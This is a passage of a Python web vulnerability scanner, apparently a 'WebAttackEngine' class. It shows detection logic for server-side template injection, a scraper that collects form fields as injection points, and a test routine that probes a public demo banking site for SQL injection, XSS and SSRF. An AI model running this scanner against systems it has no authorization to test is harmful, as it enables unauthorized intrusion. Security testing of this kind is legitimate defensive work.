                if '49' in response_text and '{{7*7}}' in payload:
                    results['vulnerable'] = True
                    results['vulnerabilities'].append({
                        'type': f'Server-Side Template Injection ({engine})',
                        'parameter': param_name,
                        'payload': payload,
                        'url': url,
                        'method': method,
                        'evidence': 'Mathematical evaluation: 7*7=49',
                        'confidence': 'High',
                        'template_engine': engine
                    })
                
                # Check for specific engine indicators
                if engine in ssti_indicators:
                    for indicator in ssti_indicators[engine]:
                        if indicator in response_text and indicator != '49':
                            results['vulnerable'] = True
                            results['vulnerabilities'].append({
                                'type': f'Server-Side Template Injection ({engine})',
                                'parameter': param_name,
                                'payload': payload,
                                'url': url,
                                'method': method,
                                'evidence': f'Template engine indicator: {indicator}',
                                'confidence': 'Medium',
                                'template_engine': engine
                            })
                            break
                
                # Check for error messages that reveal template engines
                error_patterns = {
                    'jinja2': [r'jinja2\.', r'TemplateNotFound', r'UndefinedError'],
                    'smarty': [r'Smarty', r'smarty_modifier_', r'smarty_function_'],
                    'freemarker': [r'freemarker\.', r'TemplateException', r'ParseException'],
                    'velocity': [r'velocity\.', r'VelocityEngine', r'ParseErrorException'],
                    'twig': [r'Twig_', r'TwigException', r'Twig\\']
                }
                
                if engine in error_patterns:
                    for pattern in error_patterns[engine]:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            results['vulnerable'] = True
                            results['vulnerabilities'].append({
                                'type': f'Server-Side Template Injection ({engine}) - Error-based',
                                'parameter': param_name,
                                'payload': payload,
                                'url': url,
                                'method': method,
                                'error_pattern': pattern,
                                'confidence': 'High',
                                'template_engine': engine
                            })
                            break
                
                results['payloads_tested'] += 1
                
            except Exception:
                continue
        
        return results
    
    async def _extract_test_points(self, target_url: str) -> List[Dict[str, Any]]:
        """
        Extract testable points from the target URL and linked forms
        """
        test_points = []
        
        try:
            # Test the main URL
            parsed_url = urlparse(target_url)
            
            # Extract GET parameters
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
                # Convert lists to single values
                params = {k: v[0] if isinstance(v, list) and v else '' for k, v in params.items()}
                
                test_points.append({
                    'url': f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}",
                    'method': 'GET',
                    'params': params
                })
            else:
                # Add default test parameter
                test_points.append({
                    'url': target_url,
                    'method': 'GET',
                    'params': {'test': 'value'}
                })
            
            # Fetch the page and look for forms
            response = await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: self.session.get(target_url, timeout=10)
            )
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Extract forms
                forms = soup.find_all('form')
                for form in forms:
                    action = form.get('action', '')
                    method = form.get('method', 'GET').upper()
                    
                    # Build form URL
                    if action.startswith('http'):
                        form_url = action
                    elif action.startswith('/'):
                        form_url = f"{parsed_url.scheme}://{parsed_url.netloc}{action}"
                    else:
                        form_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path.rstrip('/')}/{action}"
                    
                    # Extract form inputs
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    form_params = {}
                    
                    for input_elem in inputs:
                        name = input_elem.get('name')
                        if name:
                            input_type = input_elem.get('type', 'text')
                            value = input_elem.get('value', '')
                            
                            if input_type in ['text', 'email', 'password', 'search', 'url', 'hidden']:
                                form_params[name] = value or 'test'
                            elif input_type == 'checkbox':
                                form_params[name] = 'on'
                            elif input_type == 'radio':
                                form_params[name] = value or 'test'
                            elif input_elem.name == 'textarea':
                                form_params[name] = 'test'
                            elif input_elem.name == 'select':
                                options = input_elem.find_all('option')
                                if options:
                                    form_params[name] = options[0].get('value', 'test')
                                else:
                                    form_params[name] = 'test'
                    
                    if form_params:
                        test_points.append({
                            'url': form_url,
                            'method': method,
                            'params': form_params
                        })
        
        except Exception as e:
            # If we can't parse the page, use default test points
            test_points = [{
                'url': target_url,
                'method': 'GET',
                'params': {'test': 'value', 'id': '1', 'search': 'test'}
            }]
        
        return test_points

# Test function
async def main():
    """Test the web attack engine"""
    engine = WebAttackEngine()
    
    target = "https://demo.testfire.net"
    print(f"Testing web attacks on: {target}")
    
    # Test SQL injection
    print("\n--- SQL Injection Test ---")
    sqli_results = await engine.test_sql_injection(target)
    print(f"Vulnerable: {sqli_results['vulnerable']}")
    print(f"Payloads tested: {sqli_results['payloads_tested']}")
    for vuln in sqli_results['vulnerabilities'][:3]:
        print(f"  {vuln['type']}: {vuln.get('parameter')} - {vuln.get('confidence')}")
    
    # Test XSS
    print("\n--- XSS Test ---")
    xss_results = await engine.test_xss(target)
    print(f"Vulnerable: {xss_results['vulnerable']}")
    print(f"Payloads tested: {xss_results['payloads_tested']}")
    for vuln in xss_results['vulnerabilities'][:3]:
        print(f"  {vuln['type']}: {vuln.get('parameter')} - {vuln.get('confidence')}")
    
    # Test SSRF
    print("\n--- SSRF Test ---")
    ssrf_results = await engine.test_ssrf(target)
    print(f"Vulnerable: {ssrf_results['vulnerable']}")
    print(f"Payloads tested: {ssrf_results['payloads_tested']}")
    for vuln in ssrf_results['vulnerabilities'][:3]:
        print(f"  {vuln['type']}: {vuln.get('parameter')} - {vuln.get('confidence')}")

if __name__ == "__main__":
    asyncio.run(main())